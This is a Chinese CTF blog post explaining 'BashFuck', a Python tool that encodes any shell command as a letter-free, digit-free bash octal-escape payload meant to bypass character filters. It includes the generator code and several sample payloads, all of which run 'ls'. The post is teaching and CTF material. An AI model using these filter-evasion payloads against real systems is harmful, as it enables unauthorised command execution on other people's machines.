---
date: 2023-03-09
authors: [probius]
description: >
    通过bashshell支持ascii码的八进制转义序列的方式执行命令这一原理，我们可以结合位运算符号和Linux终端的其他特性，在没有数字的情况下继续构造这样的形式以实现无字母数字仅用几个字符就实现任意命令执行。
categories:
  - CTF
links:
  - docs/blog/posts/bashfuck.md
comments: true
---
# BashFuck_10字符完成容易命令执行

整个项目的核心是 Linux终端可以通过 `$'\xxx'` 的方式执行命令，xxx是字符ascii码的八进制形式，通过这一点，我们可以通过位运算符号和Linux终端的其他特性，在没有数字的情况下继续构造这样的形式以实现无字母数字仅用几个字符就实现任意命令执行。

当然本项目也有一定局限性，这取决于linux的系别，我们知道sh其实是一个软连接，在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash，这也是本项目名称为 Bsahfuck 的原因。

<!-- more -->



**项目地址：** **https://github.com/ProbiusOfficial/bashFuck**
**视频讲解：** **https://www.bilibili.com/video/BV1ds4y1V7Yq**

### 原理解析

#### common_otc(cmd)

```Python
def common_otc(cmd):
    payload = '$\''
    for c in cmd:
        if c == ' ':
            payload += '\' $\''
        else:
            payload += '\\' + get_oct(c)
    payload += '\''
    return info(payload)
```

首先我们知道，在终端中，`$'\xxx'`可以将八进制ascii码解析为字符，仅基于这个特性，我们可以得到第一个函数`common_otc(cmd)`，该函数将传入的命令的每一个字符转换为`$'\xxx\xxx\xxx\xxx'`的形式，但是注意，如果为连续的一串`$'\xxx\xxx\xxx\xxx'`形式，则我们无法执行带参数的命令。

比如"`ls -l`"也就是`$'\154\163\40\55\154'`，因为这样会把整个字符串当作一个单词，而不会分割成不同的参数，这里涉及到bash的一个单词分割，在Bash中，单词分割是一种将参数扩展、命令替换和算术扩展的结果分割成多个单词的过程，它发生在双引号之外，并且受到IFS变量的影响

(简单提一嘴，IFS是一个环境变量，它定义了字段分隔符，也就是用来分割字符串的字符。默认情况下，空格、制表符和换行符被认为是字段分隔符)

如果一个字符串包含空格或其他IFS字符，它会被分割成多个单词，每个单词作为一个独立的参数传递给命令。

但因为八进制转义序列是在命令行解析之前就执行的，所以它不会触发单词分割

具体原理可以参考：  
- [【Bash word splitting mechanism】](https://stackoverflow.com/questions/18498218/bash-word-splitting-mechanism)  
- [【\$IFS】](https://bash.cyberciti.biz/guide/$IFS)

#### bashfuck_x(cmd， form)

```Python
def bashfuck_x(cmd, form):
    bash_str = ''
    for c in cmd:
        bash_str += f'\\\\$(($((1<<1))#{bin(int(get_oct(c)))[2:]}))'
    payload_bit = bash_str
    payload_zero = bash_str.replace('1', '${##}')  # 用 ${##} 来替换 1
    payload_c = bash_str.replace('1', '${##}').replace('0', '${#}')  # 用 ${#} 来替换 0
    if form == 'bit':
        payload_bit = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_bit + '\\\''
        return info(payload_bit)
    elif form == 'zero':
        payload_zero = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_zero + '\\\''
        return info(payload_zero)
    elif form == 'c':
        payload_c = '${!#}<<<${!#}\\<\\<\\<\\$\\\'' + payload_c + '\\\''
        return info(payload_c)
```

基于上面的基本原理，我们引入一些表示特性和运算特性：

比如，在bash中，支持二进制的表示整数的形式：`$((2#binary))`。`$(($((1<<1))#binary))`

通过阅读bash的参考文档https://www.gnu.org/software/bash/manual/bash.html，我们知道`$`作为一个特殊字符，有多样化的功能，比如`$()`可用来表示命令替换或者算术扩展。

在这里我们引入 `$(())` 也就是 算术扩展，让其在括号中执行运算再替换到当前位置。

如果括号里面没有东西的话，也就是为`0`，那么直接`echo $(())` 我们就可以得到字符 `0`

比如我们下面引入一些位运算

左移运算符： `1<<1`可以得到`2` ；

取反：我们在 `0` 的基础上取反，就可以得到字符 `-1` （这个原理很简单，因为`0`的二进制表示是`00000000`，取反后得到`11111111`，这个数在补码表示法下就是`-1`）

除了`$()` `$` 还可以 用`${}`的方式来扩展变量，具体的用法可以参考：https://stackoverflow.com/questions/5163144/what-are-the-special-dollar-sign-shell-variables

这里我们主要用到下面的特性：

`${#var}` 可以计算 `var`变量的字符长度：

![img](https://nssctf.wdf.ink//img/WDTJ/202303091302905.png)

当然 如果 `var` 是 `#` / `_` / `?`这样的本来获取的值就是一个字符特殊参数 那么字符本身为变量，输出 `1`，

如果var为NULL即不带参数 则为 `0`

![img](https://nssctf.wdf.ink//img/WDTJ/202303091302920.png)

![img](https://nssctf.wdf.ink//img/WDTJ/202303091302937.png)

将上面的几种特性结合起来，我们就能使用 `1` `0` / `0` 甚至不用数字来构造字符的八进制形式。

比如只使用0和1：位运算让我们可以很轻松获得数字2，在下面的整数表示中就可以使用`$(($((1<<1))#binary))`来表示任意数字，然后构造八进制转义。

而在上面的基础上，我们用 `${##}` 来替换 `1` ，用 `${#}` 来替换 `0`

那么对于命令`ls`就有下面的几种写法。

```Bash
$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'

$\'\\$(($((${##}<<${##}))#${##}00${##}${##}0${##}0))\\$(($((${##}<<${##}))#${##}0${##}000${##}${##}))\'

$\'\\$(($((${##}<<${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}${##}${##}))\'
```

但是上面的命令最终只能被bash还原为八进制转义序列，不会再进一步解析了：

![img](https://nssctf.wdf.ink//img/WDTJ/202303091302930.png)

至于为什么没有进一步解析，我们需要从bash的底层说起，我们可以看参考手册了解问题的所在： https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html

```Bash
3.5 Shell Expansions
Expansion is performed on the command line after it has been split into s. There are seven kinds of expansion performed: token
brace expansion
tilde expansion
parameter and variable expansion
command substitution
arithmetic expansion
word splitting
filename expansion
The order of expansions is: brace expansion; tilde expansion， parameter and variable expansion， arithmetic expansion， and command substitution (done in a left-to-right fashion); word splitting; and filename expansion.
```

Bash在执行命令之前，会对命令行进行一系列的扩展（expansions），这些扩展包括花括号扩展（brace expansion）、波浪号扩展（tilde expansion）、**参数和变量扩展**（parameter and variable expansion）、**算术扩展（arithmetic expansion）、命令替换（command substitution）**、单词分割（word splitting）和文件名扩展（filename expansion）等，最重要的是这些扩展的顺序是固定的，而且是从左到右进行的。

也就是说，bash shell 会先对命令行中的花括号进行扩展，然后再对波浪号进行扩展，依次类推，直到完成所有的扩展为止。

我们上面的操作都是基于 **算术扩展和命令替换** 而八进制转义也就是 $'\xxx\xxx' 的执行则是依赖于**参数和变量扩展**

所以当把这一些列运算符解析成八进制转义的时候，已经执行过一次**参数和变量扩展**了，所以不会再次解析。

所以这里我们引入Linux Bash Shell的Here string语法(https://bash.cyberciti.biz/guide/Here_strings)

让八进制转义作为标准输入再完成一次解析：

```
bin/bash<<<str
```

但是这样得到的就是`$'\xxx\xxx\xxx\xxx'`命令解析形式，在前面我们说到，这种方式无法执行带参数的命令，其实到这里也好理解了，因为带参命令需要执行单词分割扩展，而解析在扩展之后，也就是说，八进制转义序列命令的解析没有单词分割这一步，而是把整个解析结果作为整体执行。

所以我们需要使用两次Here-string语法，让这个命令扩展执行两次以便完成所有的解析工作。

在前面我们提到，$作为一个特殊的字符，有很多功能(https://stackoverflow.com/questions/5163144/what-are-the-special-dollar-sign-shell-variables)

`$0` 可以表示当前脚本的文件名，在终端中，`$0`其实就是bash本身。

![img](https://nssctf.wdf.ink//img/WDTJ/202303091302892.png)

接下来 如果我们想要不用数字去构造的话，那么就要寻找`$0`的替换，这里还是直接啃参考手册（x

https://www.gnu.org/software/bash/manual/bash.html

这里使用间接扩展特性——`${!xxx}`，它表示用xxx的值作为另一个变量的名字，然后取出那个变量的值。例如，如果a=0，b=1，c=2，那么${!a}就相当于$0，${!b}就相当于$1，${!c}就相当于$2。所以我们只需要一个变量值为0的变量，就可以拿到sh

![img](https://nssctf.wdf.ink//img/WDTJ/202303091302901.png)

所以我们可以使用变量赋值，或者特殊参数构造，得到0

![img](https://nssctf.wdf.ink//img/WDTJ/202303091302436.png)

- `${#}`表示接受参数个数，在终端中参数为空 值为 0
- `${?}`表示上一条命令的退出状态，如果上一条命令异常 `${?}`值为1，如果正常退出则为0
- `${_}`表示上一个命令的最后一个参数。(如果上一个指令的输出是`0`的话，就能构造出sh了）

那么对于bash_x的三种写法也就很任意理解了：

```Bash
Command:ls
Charset : # $ ' ( ) 0 1 < \
Total Used: 9
Total length = 69
Payload = $0<<<$0\<\<\<\$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'
---------------------------
Charset : # $ ' ( ) 0 < \ { }
Total Used: 10
Total length = 117
Payload = $0<<<$0\<\<\<\$\'\\$(($((${##}<<${##}))#${##}00${##}${##}0${##}0))\\$(($((${##}<<${##}))#${##}0${##}000${##}${##}))\'
---------------------------
Charset : ! # $ ' ( ) < \ { }
Total Used: 10
Total length = 147
Payload = ${!#}<<<${!#}\<\<\<\$\'\\$(($((${##}<<${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}${##}${##}))\'
```

#### bashfuck_y(cmd)

```Python
def bashfuck_y(cmd):
    oct_list = [  # 构造数字 0-7 以便于后续八进制形式的构造
        '$(())',  # 0
        '$((~$(($((~$(())))$((~$(())))))))',  # 1
        '$((~$(($((~$(())))$((~$(())))$((~$(())))))))',  # 2
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 3
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 4
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 5
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 6
        '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 7
    ]
    bashFuck = ''
    bashFuck += '__=$(())'  # set __ to 0
    bashFuck += '&&'  # splicing
    bashFuck += '${!__}<<<${!__}\\<\\<\\<\\$\\\''  # got 'sh'

    for c in cmd:
        bashFuck += '\\\\'
        for i in get_oct(c):
            bashFuck += oct_list[int(i)]

    bashFuck += '\\\''

    return info(bashFuck)
```

在前面我们就提到过 `$(())` 的用法，在不使用`$((2#binary))`特性的情况下，我们还可以通过多个-1的叠加再取反去构造任意数字，于是就有了：

```Bash
oct_list = [  # 构造数字 0-7 以便于后续八进制形式的构造
    '$(())',  # 0
    '$((~$(($((~$(())))$((~$(())))))))',  # 1
    '$((~$(($((~$(())))$((~$(())))$((~$(())))))))',  # 2
    '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 3
    '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 4
    '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 5
    '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 6
    '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 7
]
```

这样就可以使用`$(())`去构造`$'\xxx\xxx\xxx\xxx'`

再引入我们前面提到的，变量赋值，我们就可以轻松的用`$(())`拿到sh

```Bash
bashFuck = ''
bashFuck += '__=$(())'  # set __ to 0
bashFuck += '&&'  # splicing
bashFuck += '${!__}<<<${!__}\\<\\<\\<\\$\\\''  # got 'sh'
# bashFuck = __=$(())&&${!__}<<<${!__}\\<\\<\\<\\$\\\'
```

得到我们第四种payload形式：

```Bash
Command:ls
Charset : ! $ & ' ( ) < = \ _ { } ~
Total Used: 13
Total length = 393
Payload = __=$(())&&${!__}<<<${!__}\<\<\<\$\'\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\'
```

### 总结

除开上面的几种写法，利用特性其实还能构造出不同的payload，或许还有一些方法没有被探索到，如果上面的文档存在错误欢迎师傅们指出捏，如果有新的想法也欢迎师傅们讨论。